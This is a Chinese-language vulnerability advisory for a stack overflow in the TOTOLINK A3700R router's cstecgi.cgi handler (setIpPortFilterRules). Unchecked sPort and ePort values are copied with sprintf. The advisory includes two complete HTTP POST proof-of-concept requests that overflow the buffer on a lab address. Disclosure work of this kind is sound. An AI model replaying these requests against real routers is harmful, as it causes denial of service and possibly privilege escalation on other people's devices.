

### **概述**：
影响设备：totolink A3700R

影响固件版本：V9.1.2u.6165_20211012

影响：堆栈溢出，可以造成拒绝服务和权限提升

固件下载地址：<https://download.totolink.tw/uploads/firmware/A3700R/TOTOLINK_A3700R_V9.1.2u.6165_20211012.zip>

报送邮箱 : zwx918569613@gmail.com


![](Pasted%20image%2020231022165035.png)

### **漏洞**：

该漏洞位于`cstecgi.cgi`中的函数`FUN_0041f884`，函数别名`setIpPortFilterRules`


![](Pasted%20image%2020231023212707.png)


`cstecgi.cgi`通过`topicurl`的值实现处理不同的函数接口
未对传入的参数`sPort`和`ePort`进行长度限制，而`sprintf`格式化拼接参数`sPort`或者`ePort`到变量`acStack_70`中，存在堆栈溢出漏洞


### **POC**:

复现漏洞可以通过使用真机或者使用qemu模拟
使用下方POC可以打通


~~~
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.122.15
Content-Length: 586
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.122.15
Referer: http://192.168.122.15/basic/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SESSION_ID=2:1698059537:2
Connection: close

{"topicurl": "setting/setIpPortFilterRules","addEffect":"1","sPort": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}

~~~

~~~
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.122.15
Content-Length: 586
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.122.15
Referer: http://192.168.122.15/basic/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SESSION_ID=2:1698059537:2
Connection: close

{"topicurl": "setting/setIpPortFilterRules","addEffect":"1","ePort": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}

~~~

### **影响效果**：


![](Pasted%20image%2020231023212539.png)
![](Pasted%20image%2020231023213646.png)
